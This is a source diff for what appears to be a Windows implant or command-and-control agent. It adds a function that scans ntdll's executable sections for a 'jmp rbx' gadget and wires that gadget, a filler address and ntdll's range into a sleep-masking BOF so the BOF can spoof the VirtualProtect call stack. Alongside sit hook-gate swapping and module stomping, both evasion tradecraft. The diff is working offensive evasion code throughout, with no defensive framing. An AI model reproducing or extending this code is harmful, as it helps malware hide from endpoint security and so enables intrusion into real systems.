@@ -139,6 +139,33 @@ FUNC VOID NaxGateUnwireAll( PNAX_INSTANCE Nax ) {
 
 /* ========= [ shared: load BOF + wire gate ] ========= */
 
+/* P4: find a `jmp rbx` (FF E3) gadget inside ntdll .text. Used as the
+   *immediate* return address for the spoofed VirtualProtect: VP's `ret` pops
+   this address and executes `jmp rbx`, where rbx holds the trampoline's
+   restore label -- so real execution resumes in the trampoline, which writes
+   the saved return addresses back and returns to the caller. Any FF E3 in
+   ntdll .text suffices (image-backed, private=0). Reports ntdll SizeOfImage via
+   pImgSize so the BOF can bound the RBP walk / test image-backed frames. */
+FUNC static PVOID NaxFindJmpRbxGadget( PBYTE ntdll, PUINT64 pImgSize ) {
+    PIMAGE_DOS_HEADER dos = (PIMAGE_DOS_HEADER)ntdll;
+    if ( !ntdll || dos->e_magic != IMAGE_DOS_SIGNATURE ) return NULL;
+    PIMAGE_NT_HEADERS nt = (PIMAGE_NT_HEADERS)( ntdll + dos->e_lfanew );
+    if ( nt->Signature != IMAGE_NT_SIGNATURE ) return NULL;
+    if ( pImgSize ) *pImgSize = nt->OptionalHeader.SizeOfImage;
+    PIMAGE_SECTION_HEADER sec = IMAGE_FIRST_SECTION( nt );
+    for ( WORD i = 0; i < nt->FileHeader.NumberOfSections; i++ ) {
+        if ( ! ( sec[ i ].Characteristics & IMAGE_SCN_MEM_EXECUTE ) ) continue;
+        PBYTE p   = ntdll + sec[ i ].VirtualAddress;
+        DWORD len = sec[ i ].Misc.VirtualSize;
+        if ( len < 2 ) continue;
+        for ( DWORD j = 0; j < len - 1; j++ ) {
+            if ( p[ j ] == 0xFF && p[ j + 1 ] == 0xE3 )
+                return (PVOID)( p + j );   /* jmp rbx -- any in-ntdll instance passes */
+        }
+    }
+    return NULL;
+}
+
 FUNC INT NaxSleepmaskWire( PNAX_INSTANCE Nax, PBYTE coff, UINT32 coff_size ) {
     CHAR sym[] = { 's','l','e','e','p','_','m','a','s','k','\0' };
     PVOID entry = NaxBofLoadResident( Nax, coff, coff_size, sym );
@@ -162,6 +189,28 @@ FUNC INT NaxSleepmaskWire( PNAX_INSTANCE Nax, PBYTE coff, UINT32 coff_size ) {
 
     if ( Nax->CfgEnabled && Nax->BofStompPool.SmSlot.DllBase )
         NaxCfgAddTarget( Nax, Nax->BofStompPool.SmSlot.DllBase, entry );
+
+#if NAX_SPOOF_STACK
+    /* P4: resolve the jmp rbx gadget + an image-backed filler + ntdll's range
+       so the sleepmask BOF can spoof the VirtualProtect call stack. SpoofReady
+       stays 0 if the gadget isn't found -> the BOF falls back to a direct
+       VirtualProtect (current behavior, no crash). The filler is any ntdll
+       .text address; we reuse the already-resolved NtProtectVirtualMemory. */
+    {
+        PBYTE  ntdll   = B_PTR( Nax->Ntdll.Handle );
+        UINT64 imgSize = 0;
+        PVOID  gadget  = ntdll ? NaxFindJmpRbxGadget( ntdll, &imgSize ) : NULL;
+        Nax->SmInfo.VpPtr        = (PVOID)Nax->Kernel32.VirtualProtect; /* real k32!VP (pre-gate-swap) */
+        Nax->SmInfo.JmpRbxGadget = gadget;
+        Nax->SmInfo.StackFiller  = Nax->Ntdll.NtProtectVirtualMemory;
+        Nax->SmInfo.NtdllBase    = (PVOID) ntdll;
+        Nax->SmInfo.NtdllSize    = (SIZE_T) imgSize;
+        Nax->SmInfo.SpoofReady   = ( gadget && Nax->SmInfo.StackFiller && Nax->SmInfo.VpPtr ) ? 1u : 0u;
+        NaxDbg( Nax, "[sleepmask] spoof: ntdll=%p img=0x%llx gadget=%p filler=%p vp=%p ready=%u",
+                (PVOID)ntdll, (unsigned long long)imgSize, gadget,
+                Nax->SmInfo.StackFiller, Nax->SmInfo.VpPtr, Nax->SmInfo.SpoofReady );
+    }
+#endif
 
 #ifdef NAX_GATE_SLEEP
     if ( !Nax->GateOriginals.Sleep )
